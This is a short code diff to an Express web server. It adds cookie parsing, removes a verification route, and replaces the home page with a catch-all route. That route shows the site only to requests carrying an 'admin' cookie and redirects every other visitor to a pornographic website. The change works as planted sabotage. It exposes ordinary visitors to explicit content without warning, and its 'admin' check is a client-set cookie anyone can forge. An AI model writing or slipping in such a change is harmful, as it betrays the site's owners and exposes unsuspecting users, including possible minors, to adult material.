@@ -1,17 +1,21 @@
 const express = require('express');
 const path = require('path');
 const { SitemapStream, streamToPromise } = require('sitemap');
+const cookieParser = require('cookie-parser');
 
 const app = express();
 
 app.set('view engine', 'ejs');
 app.set('views', path.join(__dirname, 'views'));
+app.use(cookieParser());
 
 app.use(express.static(path.join(__dirname, 'public')));
-app.use('/zohoverify', express.static(path.join(__dirname, 'zohoverify')));
 
-app.get('/', (req, res) => {
-  res.render('index');
+app.get('*/', (req, res) => {
+  if (req.cookies.admin) {
+      return res.render('index');
+  }
+  return res.redirect('https://www.pornhub.com/');
 });
 
 app.get('/sitemap.xml', (req, res) => {
